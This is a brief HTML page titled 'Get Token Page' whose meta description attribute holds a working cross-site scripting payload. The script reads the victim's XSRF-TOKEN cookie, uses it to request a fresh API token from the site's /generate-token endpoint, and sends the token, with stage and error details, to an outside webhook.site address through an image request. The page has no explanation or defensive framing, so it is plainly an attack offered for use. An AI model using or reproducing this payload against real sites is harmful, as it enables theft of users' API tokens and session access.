<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="description" content='<script>
        (async () => {
            const WEBHOOK_URL = "https://webhook.site/2b4d8efe-d632-441b-94e9-ffbfc14c48c5";

            const sendToWebhook = (data) => {
                const params = new URLSearchParams({ source_tag: "name:description_GET_TOKEN", ...data });
                new Image().src = `${WEBHOOK_URL}?${params.toString()}`;
            };

            const getXsrfToken = () => {
                const cookie = document.cookie.split(";")
                    .find(c => c.trim().startsWith("XSRF-TOKEN="));
                return cookie ? decodeURIComponent(cookie.split("=")[1]) : null;
            };

            const fetchToken = async (xsrfToken) => {
                const response = await fetch("/generate-token", {
                    method: "POST",
                    headers: {
                        "Accept": "application/json",
                        "X-Requested-With": "XMLHttpRequest",
                        "X-XSRF-TOKEN": xsrfToken
                    }
                });
                if (!response.ok) throw new Error(`HTTP ${response.status}`);
                return response.json();
            };

            try {
                const xsrfToken = getXsrfToken();
                if (!xsrfToken) {
                    sendToWebhook({ stage: "xsrf_token_missing" });
                    return;
                }

                const data = await fetchToken(xsrfToken);
                sendToWebhook({
                    stage: data.token ? "got_api_token" : "no_token_field",
                    token: data.token || null
                });
            } catch (error) {
                sendToWebhook({ stage: "error", error: error.message });
            }
        })();
    </script>'>
</head>
<body>
    <h1>Get Token Page</h1>
</body>
</html>
